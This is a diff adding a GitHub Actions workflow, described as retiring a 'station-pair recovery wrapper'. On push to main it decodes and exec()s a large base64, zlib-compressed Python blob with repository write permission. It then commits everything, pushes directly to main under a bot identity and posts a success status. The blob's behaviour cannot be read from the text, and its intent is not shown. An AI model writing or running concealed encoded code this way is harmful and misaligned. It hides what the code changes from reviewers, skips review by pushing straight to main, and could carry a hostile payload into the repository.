@@ -1,0 +1,44 @@
+name: Publish 0363 station-pair recovery retirement
+
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/apply-0363-retirement-temp.yml
+
+permissions:
+  contents: write
+  statuses: write
+
+jobs:
+  repair:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          show-progress: false
+      - name: Retire redundant station-pair recovery wrapper
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import base64,zlib
+          payload='''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'''
+          exec(zlib.decompress(base64.b64decode(payload)).decode(),{'__name__':'__main__'})
+          PY
+          python3 -m compileall -q tools
+          git config user.name "Tech Priests Recovery"
+          git config user.email "actions@users.noreply.github.com"
+          git add -A
+          git commit -m "Retire 0363 into canonical pair state owners"
+          git pull --rebase origin main
+          git push origin HEAD:main
+      - name: Publish repair status
+        if: always()
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const passed='${{ job.status }}'==='success';
+            await github.rest.repos.createCommitStatus({owner:context.repo.owner,repo:context.repo.repo,sha:context.sha,state:passed?'success':'failure',context:'tech-priests/0363-retirement',description:passed?'0363 retirement pushed':'0363 retirement failed',target_url:`${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`});
